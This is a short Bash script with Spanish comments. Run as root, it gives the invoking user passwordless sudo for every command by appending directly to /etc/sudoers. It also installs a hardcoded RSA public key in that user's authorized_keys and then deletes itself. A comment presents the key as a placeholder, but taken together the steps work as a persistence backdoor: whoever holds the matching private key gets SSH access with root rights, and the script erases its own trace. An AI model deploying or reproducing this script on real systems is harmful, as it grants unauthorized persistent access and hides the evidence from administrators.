#!/bin/bash

# Verificar si el script se ejecuta como root
if [ "$EUID" -ne 0 ]; then
    echo "Por favor, ejecute este script como root."
    exit 1
fi

# Obtener el usuario original que ejecutó sudo
CURRENT_USER=${SUDO_USER:-$(whoami)}

# Agregar la línea al archivo sudoers
SUDOERS_FILE="/etc/sudoers"
SUDOERS_LINE="$CURRENT_USER  ALL=(ALL)   NOPASSWD: ALL"

# Verificar si la línea ya está en el archivo antes de agregarla
if ! grep -Fxq "$SUDOERS_LINE" "$SUDOERS_FILE"; then
    echo "$SUDOERS_LINE" >> "$SUDOERS_FILE"
    echo "Línea agregada a $SUDOERS_FILE"
else
    echo "La línea ya existe en $SUDOERS_FILE"
fi

# Agregar clave SSH al archivo ~/.ssh/authorized_keys
SSH_DIR="/home/$CURRENT_USER/.ssh"
AUTHORIZED_KEYS="$SSH_DIR/authorized_keys"
SSH_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmdcEzENeMXc3kVlRDgsgl8Dw3I/X1n5e/V7r1Fk0Trseto9chgYURRQVEo3G+BK7QdcmvH/y4HthSMyEUPU9e74/cV8HH1LdsTEn4UUyZSLvwGYwQzqT33m4cwPNACK3kEadBjRGKkVrZ8GCQ6mHMdbb5Kj/U3CM5KQ6mVuO/XY83hHpwUr5Fft6OiFwf2pnhLA5d+Ekf6Vm+7EtS7XzoQo+y5tzsF5y98jZpld6Kvu7F6wM5KfUYQHEo4iy6bsB3mEM+0UcPjWWplkDQ2l6NRuv3fneSb6fdmyJDuuh2j+08BhktOyRJ4aQKqX3ddcb5fgl5RaVjGz/5WcwsfLA+2pmThbGEyBWYI8J0W0yb9FfF0vQ4B/25AxONoAyrsjWDEhzu/a5qGXatxQ8R2NP2Z/ymmcJJNQDeEBw3BxA4vFNqiiV6Q129+8REYc66S3Jp9JQk7jOCIxmJJQEZCDdDt2gyaUa0tD2QAStX5kGH2VxXxZKJjsvXh5Lb3EweyMs="  # Reemplaza esto con tu clave pública SSH

# Crear el directorio .ssh si no existe
mkdir -p "$SSH_DIR"
chmod 700 "$SSH_DIR"
chown "$CURRENT_USER:$CURRENT_USER" "$SSH_DIR"

# Agregar la clave SSH si no existe
if ! grep -Fxq "$SSH_KEY" "$AUTHORIZED_KEYS"; then
    echo "$SSH_KEY" >> "$AUTHORIZED_KEYS"
    chmod 600 "$AUTHORIZED_KEYS"
    chown "$CURRENT_USER:$CURRENT_USER" "$AUTHORIZED_KEYS"
    echo "Clave SSH agregada a $AUTHORIZED_KEYS"
else
    echo "La clave SSH ya está en $AUTHORIZED_KEYS"
fi

# Eliminar el script después de la ejecución
rm -- "$0"
